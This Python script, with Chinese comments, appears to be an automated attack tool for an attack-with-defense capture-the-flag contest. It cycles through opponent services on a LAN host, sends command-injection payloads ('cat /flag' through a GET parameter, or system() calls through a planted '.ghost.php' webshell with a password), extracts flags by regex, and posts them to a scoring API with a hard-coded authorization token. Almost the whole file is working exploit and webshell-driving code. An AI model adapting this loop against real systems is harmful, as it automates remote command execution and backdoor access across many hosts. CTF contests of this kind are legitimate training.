# coding=utf-8
import time
import re
import requests
import json

############################################################
###################### READ ME FIREST ######################
############################################################
# 需要修改的内容：
# 1、main函数中的ip、port、method、payload配置
# 2、attack函数re.search内容
# 3、submit函数中提交格式格式
# 需要注意的事项：
# 1、attack中的remote或request必须设置timeout
# 2、接受flag前一定要把其他回显接收完
# 3、正式运行时将debug关闭，减少回显
#############################################################


def attack(ip, port, method, url_end, payload):  # 命令执行漏洞
    try:
        ################## 构造payload ################
        ################## post 方法 ##################
        # flag_data = {'pass': 'shang', 'a': "system('cat /flag');"}
        # r = requests.post("http://" + ip + ":" + port + "/sqlgunadmin/kindedit/attached/20220715/.ghost.php",
        #                   data=flag_data, timeout=10)
        ################## get 方法 ###################
        # r = requests.get("http://" + ip + ":" + port +
        #                  "/index.php?copyright=cat /flag")
        if method == 'get':
            r = requests.get("http://" + ip + ":" + port +
                             url_end + payload, timeout=10)
        elif method == 'post':
            r = requests.post("http://" + ip + ":" + port +
                              url_end, data=payload, timout=10)
        ## 正则匹配flag
        flag = re.search(r'lhsw\{.*\}', r.text).group()
        #flag = re.search(r'flag\{.*\}', r.text).group()
        ## 打印攻击结果
        print("[\033[0;36mFLAGS\033[0m] " + ip + ":" + port +
              "\033[0m Flag is : \033[0;36m" + flag + "\033[0m")
        return flag

    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port +
              "\033[0m Can not attack, because: \033[0;31m" + str(e) + "\033[0m")
        return False


def submit(ip, port, flag_text):  # 提交flag
    try:
        ## 构造submit flag 参数
        submit_url = 'http://192.168.15.80:19999/api/flag'
        flag_header = {
            "Content-Type": "application/json;charset=utf-8",
            "Authorization": "1b1fae078083811a61e7794e8320755b",
        }
        ## json格式化flag
        flag_data = json.dumps({"flag": flag_text})
        r = requests.post(submit_url, data=flag_data, headers=flag_header)
        submit_re = re.search(r'\"msg\"\:\".*\"', r.text).group()
        # 测试用代码段⬇⬇⬇⬇⬇⬇
        # submit_url = 'http://192.168.110.182:8888/flag_request.php'
        # flag_data = {'my_token': '2333333333333','flag':flag_text}
        # r = requests.post(submit_url, data=flag_data)
        # submit_re = re.search(r'attack.*success', r.text).group()
        # 测试用代码段⬆⬆⬆⬆⬆⬆
        ##########################


        if submit_re.find('success') != -1:
            print("[\033[0;32mSUCCE\033[0m] " +
                  ip + ":" + port + ' ' + submit_re)
        else:
            print("[\033[0;35mFAIL!\033[0m] " +
                  ip + ":" + port + ' ' + submit_re)
    except Exception as e:
        print(
            "[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port + "\033[0m Submit failed, because: \033[0;31m" + str(
                e) + "\033[0m")
        return False


def main():
    try:
        # 一轮中所有队伍
        for i in range(8801, 8887):
            self_id = 8802  # 跳过自己的队伍ip/端口
            if i == self_id:
                continue
            ##构造attack参数
            server_ip = "192.168.15.80"
            server_port = str(i)
            server_method = 'get'
            # server_method = 'post'
            server_url_end = '/index.php'
            server_payload = '?copyright=cat /flag'  # get方式
            # server_payload = {'pass': 'shang', 'a': "system('cat /flag');"} #post 方式
            # # 测试用代码段⬇⬇⬇⬇⬇⬇
            # server_ip = "192.168.110.182"
            # server_port = str(i)
            # server_method = 'get'
            # # server_method = 'post'
            # server_url_end = '/task_request.php'
            # # server_payload = {'task_content': '123456', 'task_id': "2333333"} #post 方式
            # server_payload = 'test'
            # #测试用代码段⬆⬆⬆⬆⬆⬆            
            # 开始攻击
            flag_text = attack(server_ip, server_port,
                               server_method, server_url_end, server_payload)
            # 获取flag成功后
            if flag_text != False:
                submit(server_ip, str(i), flag_text)
            time.sleep(1)
        print("[\033[0;30;43mROUND\033[0m] " + time.strftime("%Y-%m-%d %H:%M:%S",
              time.localtime()) + " Round attack end, waitting for next round.")
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mMain function error, because: " + str(e) + "\033[0m")
        exit(0)


if __name__ == '__main__':
    try:
        while 1:
            # 每个轮次
            print("[\033[0;30;43mROUND\033[0m] " + time.strftime("%Y-%m-%d %H:%M:%S",
                                                                 time.localtime()) + " Begin to attack")
            main()
            time.sleep(2 * 6)
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mMain function error, because: " + str(e) + "\033[0m")
        exit(0)
